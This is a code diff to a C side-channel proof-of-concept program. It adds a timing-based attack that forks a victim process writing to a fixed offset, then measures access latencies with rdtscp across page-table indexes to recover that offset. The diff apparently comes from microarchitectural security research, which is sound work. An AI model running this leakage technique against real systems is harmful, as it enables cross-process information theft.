@@ -126,6 +126,64 @@ mmap_fail:
     return ret;
 }
 
+static int __attribute__((noinline)) store_offset_recovery_latency() {
+    int ret = 0;
+    const u32 MEASURES = 10000;
+    pid_t pid = fork();
+    if (pid == 0) {
+        usleep(200);
+        while (true) {
+            // normal_page is NOT shared, the child process will make a copy on
+            // write
+            _mwrite(&normal_page[VICTIM_STORE_OFFSET], 0xff);
+        }
+    } else if (pid < 0) {
+        fprintf(stderr, "Failed to fork.\n");
+        return 2;
+    }
+
+    usleep(rand() % 256);
+    u32 factor = 3;
+    u64 num_pages = 512 * factor; // = 128 * 12 = sTLB size on Skylake
+    // allocate 512 pages to cover all possible PL1 (PTE) indexes
+    u8 *pages = setup_page(NULL, num_pages * PAGE_SIZE, 0x1 /* init value */);
+    if (!pages) {
+        ret = 3;
+        goto mmap_fail;
+    }
+
+    u64 *results = malloc(sizeof(u64) * 512);
+    if (!results) {
+        goto malloc_fail;
+    }
+    memset(results, 0, sizeof(u64) * 512);
+
+    for (u64 cnt = 0; cnt < num_pages * MEASURES; cnt++) {
+        u64 idx = (cnt * 167 + 13) % num_pages;
+        u8 *ptr = pages + idx * PAGE_SIZE + ((cnt * 167 + 13) % 64) * 64;
+        u32 sig;
+        u64 t_start, t_diff;
+
+        t_start = _rdtscp(&sig);
+        _maccess(ptr);
+        t_diff = _rdtscp(&sig) - t_start;
+
+        u16 pte_offset = ((uintptr_t)ptr & 0x1ff000) >> 12;
+        results[pte_offset] += t_diff;
+    }
+
+    for (u32 offset = 0; offset < INDEX_COUNT; offset++) {
+        printf("%#5x\t%5lu\n", offset << 3, results[offset] / MEASURES / factor);
+    }
+
+    free(results);
+malloc_fail:
+    munmap(pages, num_pages);
+mmap_fail:
+    kill(pid, SIGKILL);
+    return ret;
+}
+
 #define VICTIM_LOAD_ADDR (0x439948621000ull)
 static int __attribute__((noinline)) load_page_recovery_throughput() {
     int ret;
@@ -286,6 +344,7 @@ static int __attribute__((noinline)) load_page_recovery_contention() {
 }
 
 #define STORE_OFFSET_POC "store_offset"
+#define STORE_OFFSET_LAT_POC "store_offset_latency"
 #define LOAD_PAGE_TRP_POC "load_page_throughput"
 #define LOAD_PAGE_CTT_POC "load_page_contention"
 
@@ -293,6 +352,7 @@ int main(int argc, char **argv) {
     if (argc < 2) {
         fprintf(stderr, "Expect one of these arguments:\n"
                         "\t" STORE_OFFSET_POC "\n"
+                        "\t" STORE_OFFSET_LAT_POC "\n"
                         "\t" LOAD_PAGE_TRP_POC "\n"
                         "\t" LOAD_PAGE_CTT_POC "\n");
         return 1;
@@ -322,6 +382,8 @@ int main(int argc, char **argv) {
     srand(0);
     if (strcmp(argv[1], STORE_OFFSET_POC) == 0) {
         ret = store_offset_recovery();
+    } else if (strcmp(argv[1], STORE_OFFSET_LAT_POC) == 0) {
+        ret = store_offset_recovery_latency();
     } else if (strcmp(argv[1], LOAD_PAGE_TRP_POC) == 0) {
         ret = load_page_recovery_throughput();
     } else if (strcmp(argv[1], LOAD_PAGE_CTT_POC) == 0) {
